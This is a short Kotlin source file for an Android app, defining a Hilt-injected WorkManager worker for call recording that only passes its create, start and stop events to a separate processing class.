package com.android.services.workers.callRecord

import android.content.Context
import androidx.hilt.work.HiltWorker
import androidx.work.WorkerParameters
import com.android.services.di.module.ApplicationScope
import com.android.services.interfaces.IWorkerProcessing
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.workers.base.BaseWorker
import dagger.assisted.Assisted
import dagger.assisted.AssistedInject
import kotlinx.coroutines.CoroutineScope

@HiltWorker
class CallRecordWorkerService @AssistedInject constructor(
    @Assisted val context: Context,
    @Assisted parameters: WorkerParameters,
    val localDatabaseSource: LocalDatabaseSource,
    @ApplicationScope val coroutineScope: CoroutineScope
) :
    BaseWorker(context, parameters, CallRecordProcessingBase.CALL_RECORDING_WORKER_TAG) {
    private lateinit var callRecordProcessingBaseImpll: IWorkerProcessing
    override fun onCreate() {
        callRecordProcessingBaseImpll =
            CallRecordProcessingBaseImpll(context, localDatabaseSource, coroutineScope)
        callRecordProcessingBaseImpll.onCreate()
    }

    override fun onStartCommand() {
        callRecordProcessingBaseImpll.onStartCommand(inputData)
    }

    override fun onStop() {
        callRecordProcessingBaseImpll.onDestroy()
    }

}